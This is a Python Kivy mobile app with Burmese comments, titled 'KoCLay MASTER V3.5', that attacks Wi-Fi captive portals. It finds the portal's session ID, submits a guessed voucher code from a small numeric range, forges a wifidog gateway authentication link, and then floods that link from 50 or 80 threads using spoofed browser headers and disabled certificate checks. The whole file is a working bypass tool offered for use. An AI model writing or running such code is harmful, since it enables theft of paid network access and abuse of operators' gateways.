import urllib3, time, threading, random, socket, re, requests
from urllib.parse import urlparse, parse_qs, urljoin

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.clock import Clock

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- မူလ Python ထဲက အချက်အလက်များ ---
VOUCHER_LIST = [str(i) for i in range(123400, 123501)]
AI_STATUS = "Ready"
LAST_PING = 0
STOP_THREADS = threading.Event()

def get_advanced_headers():
    browsers = [
        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (Linux; Android {random.randint(11,14)}; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    ]
    return {
        "User-Agent": random.choice(browsers),
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

def turbo_pulse(link, mode):
    global LAST_PING, AI_STATUS
    payload = "koclay" * 5
    while not STOP_THREADS.is_set():
        try:
            start = time.time()
            requests.get(link, timeout=5, verify=False, headers=get_advanced_headers(), params={'data': payload})
            LAST_PING = int((time.time() - start) * 1000)
            AI_STATUS = "Stable" if LAST_PING < 250 else "Rescue"
            time.sleep(0.1)
        except:
            AI_STATUS = "Rescue"
            time.sleep(0.5)

# --- App UI နှင့် လုပ်ဆောင်ချက်ပိုင်း ---
class KoCLayApp(App):
    def build(self):
        # မျက်နှာပြင် အပြင်အဆင်
        layout = BoxLayout(orientation='vertical', padding=20, spacing=15)
        
        # ခေါင်းစဉ်
        title = Label(text="[b][color=00FFFF]KoCLay MASTER V3.5[/color][/b]", markup=True, font_size='24sp', size_hint_y=0.2)
        layout.add_widget(title)
        
        # အခြေအနေပြ စာသား
        self.status_label = Label(text="AI Status: Ready\nPing: 0ms\nWaiting for command...", font_size='18sp', halign="center")
        layout.add_widget(self.status_label)
        
        # ခလုတ်များ
        btn_balanced = Button(text="🛡️ Balanced Mode (50 Threads)", background_color=(0, 0.8, 0, 1), size_hint_y=0.2)
        btn_balanced.bind(on_press=lambda x: self.start_attack("1"))
        layout.add_widget(btn_balanced)
        
        btn_turbo = Button(text="🔥 Turbo Mode (80 Threads)", background_color=(0.8, 0, 0, 1), size_hint_y=0.2)
        btn_turbo.bind(on_press=lambda x: self.start_attack("2"))
        layout.add_widget(btn_turbo)
        
        btn_stop = Button(text="⏹️ Stop", background_color=(0.5, 0.5, 0.5, 1), size_hint_y=0.15)
        btn_stop.bind(on_press=self.stop_attack)
        layout.add_widget(btn_stop)

        # UI ကို တစ်စက္ကန့်ဝက် တစ်ခါ Update လုပ်မယ်
        Clock.schedule_interval(self.update_ui, 0.5)
        
        return layout

    def update_ui(self, dt):
        # နောက်ကွယ်က ပြောင်းလဲသွားတဲ့ Ping နဲ့ Status ကို မျက်နှာပြင်မှာ လာပြတာပါ
        self.status_label.text = f"AI Status: {AI_STATUS}\nPing: {LAST_PING}ms"

    def stop_attack(self, instance):
        global AI_STATUS, LAST_PING
        STOP_THREADS.set()
        AI_STATUS = "Stopped"
        LAST_PING = 0
        self.status_label.text = "All connections stopped."

    def start_attack(self, choice):
        global AI_STATUS
        AI_STATUS = "Discovery..."
        STOP_THREADS.clear()
        
        # နောက်ကွယ်ကနေ အလုပ်လုပ်ဖို့ Thread သစ်ခွဲထုတ်တာပါ (App မဟန့်သွားအောင်လို့ပါ)
        threading.Thread(target=self.core_logic, args=(choice,), daemon=True).start()

    def core_logic(self, choice):
        global AI_STATUS
        threads_count = 80 if choice == "2" else 50
        session = requests.Session()
        
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=8)
            p_url = r.url
            parsed = urlparse(p_url)
            
            gw = parse_qs(parsed.query).get('gw_address', [parsed.netloc.split(':')[0]])[0]
            if not gw: gw = socket.gethostbyname(parsed.netloc)
            
            r1 = session.get(p_url, verify=False, timeout=8, headers=get_advanced_headers())
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, m.group(1)) if m else p_url
            
            r2 = session.get(n_url, verify=False, timeout=8, headers=get_advanced_headers())
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                AI_STATUS = "Bypassing..."
                v_code = random.choice(VOUCHER_LIST)
                time.sleep(1) 
                session.post(f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/", 
                             json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, 
                             timeout=5, headers=get_advanced_headers())
                
                auth_link = f"http://{gw}:2060/wifidog/auth?token={sid}"
                AI_STATUS = "BYPASS SUCCESS! ⚡"
                time.sleep(1)
                
                # Turbo/Balanced Threads များကို စတင်ခြင်း
                for _ in range(threads_count):
                    threading.Thread(target=turbo_pulse, args=(auth_link, choice), daemon=True).start()
                
                # လိုင်းကျမကျ စစ်ဆေးခြင်း
                while not STOP_THREADS.is_set():
                    time.sleep(2)
                    try:
                        c = requests.get("http://www.google.com/generate_204", timeout=5)
                        if c.status_code != 204: raise Exception("Off")
                    except:
                        if not STOP_THREADS.is_set():
                            AI_STATUS = "Rescue"
                            break
            else:
                AI_STATUS = "No Captive Portal found."
                
        except Exception as e:
            AI_STATUS = "Error / Network Issue"

if __name__ == '__main__':
    KoCLayApp().run()
